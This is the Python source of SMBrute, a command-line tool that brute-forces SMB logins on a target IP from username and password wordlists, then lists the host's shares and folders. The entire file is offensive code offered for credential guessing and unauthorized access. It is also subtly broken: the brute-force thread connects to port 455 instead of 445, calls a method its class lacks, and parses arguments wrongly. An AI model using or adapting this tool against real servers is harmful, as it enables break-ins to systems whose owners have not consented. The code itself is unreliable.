#!/usr/bin/env python3
# Coded by Momo Outaadi (M4ll0k)
# https://github.com/m4ll0k


'''
SMBrute is a program that can be used to bruteforce username and passwords of servers that are using SMB (Samba).

'''


import re
import sys
import getopt
from time import sleep
from threading import Thread
from smb.SMBConnection import SMBConnection
from humanfriendly.tables import format_pretty_table

class thread(Thread):
	def __init__(self,kwargs):
		Thread.__init__(self)
		self.user = kwargs['user']
		self.passwd = kwargs['passwd']
		self.target = kwargs['host']
		self.timeout = kwargs['timeout']

	def run(self):
		while True:
			try:
				smb = SMBConnection(username = self.user,
					password = self.passwd, my_name='', remote_name='', domain='',
					use_ntlm_v2 = True, is_direct_tcp=True)
				resp = smb.connect(self.target,455,timeout=self.timeout)
			except Exception as e:
				exit(0)
			if resp:
				print('[+] Username: %s'%self.user)
				print('[+] Password: %s'%self.passwd)
				self.Info(smb)
				exit(0)

class SMBrute(object):
	def banner(self):
		print(" _____ _____ _____         _       ")
		print("|   __|     | __  |___ _ _| |_ ___ ")
		print("|__   | | | | __ -|  _| | |  _| -_|")
		print("|_____|_|_|_|_____|_| |___|_| |___|\n")
		print("SMBrute - SMB Protocol Bruteforce")
		print("\tVersion 0.1.0")
		print("    Momo Outaadi (M4ll0k)\n")
		print("-"*40)

	def usage(self):
		self.banner()
		print("Usage: smbrute.py [OPTIONS]\n")
		print("\t-h --host\tTarget IP")
		print("\t-u --user\tSet username")
		print("\t-f --folder\tShow folder file")
		print("\t-p --passwd\tSet password")
		print("\t-U --uwordlist\tUsername wordlist")
		print("\t-P --pwordlist\tPassword wordlist")
		print("\t-t --timeout\tSet timeout, default 5\n")
		exit(0)

	def main(self):
		kwargs = {
		          'host':None,'user':None,'passwd':None,'timeout':5,
		          'uwordlist':None,'pwordlist':None,'folder':None,
		          }
		if len(sys.argv) < 2:
			self.usage()
		try:
			opts,args = getopt.getopt(sys.argv,'h:u:p:f:U:P:t:',
				['host=','user=','passwd=','folder=','uwordlist=','pwordlist=',
				'timeout=']
				)
		except getopt.error as e:
			self.usage()
		self.banner()
		for o in args:
			if o in ('-h','--host'):kwargs['host']=args[args.index(o)+1]
			if o in ('-u','--user'):kwargs['user']=args[args.index(o)+1]
			if o in ('-f','--folder'):kwargs['folder']=args[args.index(o)+1]
			if o in ('-p','--passwd'):kwargs['passwd']=args[args.index(o)+1]
			if o in ('-U','--uwordlist'):kwargs['uwordlist']=args[args.index(o)+1]
			if o in ('-P','--pwordlist'):kwargs['pwordlist']=args[args.index(o)+1]
			if o in ('-t','--timeout'):kwargs['timeout']=args[args.index(o)+1]
		if kwargs['host'] == ('' or None) or not re.search('\d*\.\d*\.\d*\.\d*',kwargs['host']):self.usage()
		b,s = self.checkAuth(kwargs['host'])
		if b:
			print('[+] Host %s authentication disabled'%(kwargs['host']))
			if kwargs['folder']:self.showFolder(s,kwargs['folder'])
			self.Info(s)
		else:
			print('[-] Host %s authentication enabled'%(kwargs['host']))
			if not kwargs['uwordlist'] and not kwargs['pwordlist']:
				print('[!] Please set wordlist for bruteforcing')
				exit(0)
			print('[+] Start bruteforcing...')
			if kwargs['uwordlist']!=('' or None):uwordlist=self.readfile(kwargs['uwordlist'])
			if kwargs['pwordlist']!=('' or None):pwordlist=self.readfile(kwargs['pwordlist'])
			for user in uwordlist:
				for passwd in pwordlist:
					sys.stdout.write('[+] Username: %s Password: %s\r\r'
						%(user.decode('utf-8'),passwd.decode('utf-8')))
					sys.stdout.flush()
					kwargs['user'] = user
					kwargs['passwd'] = passwd
					t = thread(kwargs)
					t.daemon = True
					t.start()
					sleep(0.001)
					t.join()
			print('\n[!] Not found credentials in wordlist')
			exit(0)

	def readfile(self,path):
		return [l.strip() for l in open(path,'rb')]

	def checkAuth(self,host):
		try:
			smb = SMBConnection('','','','',use_ntlm_v2=True,is_direct_tcp=True)
			resp = smb.connect(host,445)
			return resp,smb
		except Exception as e:
			print('[ERROR] %s'%e)
			exit(0)

	def showFolder(self,smb,path):
		print('[+] Show %s Files...'%(path))
		names = []
		column = ['Filename','ReadOnly']
		try:
			dir_ = smb.listPath(path,'/')
		except Exception as e:
			print('[!] Failed to list \ on %s: Unable to connect to shared device'%path)
			exit(0)
		for file in dir_:
			names.append([file.filename,file.isReadOnly])
		print(format_pretty_table(names,column))
		exit(0)

	def Info(self,smb):
		print('[+] Showing folders..')
		names = []
		column = ['Name','Type','Comments']
		shares = smb.listShares()
		for share in shares:
			names.append([share.name,share.type,share.comments])
		print(format_pretty_table(names,column))

if __name__ == "__main__":
	try:
		SMBrute().main()
	except KeyboardInterrupt as e:
		print('[!] Keyboard Interrupt by User!!')
		exit(0)
